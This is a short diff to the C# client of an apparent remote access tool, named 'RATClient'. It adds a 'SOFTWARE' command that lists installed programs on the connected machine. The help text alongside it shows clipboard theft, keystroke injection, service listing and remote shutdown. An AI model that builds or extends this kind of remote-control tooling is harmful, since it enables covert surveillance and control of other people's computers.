@@ -48,6 +48,7 @@ namespace RATClient
                     case "services":
                     case "retrieve":
                     case "search":
+                    case "software":
                         if (!ConnectCheck()) break;
                         SendCommand(CMDS);
                         break;
@@ -136,7 +137,7 @@ namespace RATClient
             return sock.Connected;
         }
         static void Help()
-        {
+        {            
             Console.WriteLine("CLEAR          Clear The Screen");
             Console.WriteLine("CLIPBOARD      Return ClipBoard Text If Present");
             Console.WriteLine("CONNECT        Start A Connection");
@@ -154,6 +155,7 @@ namespace RATClient
             Console.WriteLine("SENDKEYS       Send Key Presses To The Server");
             Console.WriteLine("SERVICES       List Running Services");
             Console.WriteLine("SHUTDOWN       Shutdown The Server");
+            Console.WriteLine("SOFTWARE       List Installed Software");
         }
         static T DeserializeFromXml<T>(string xml)
         {
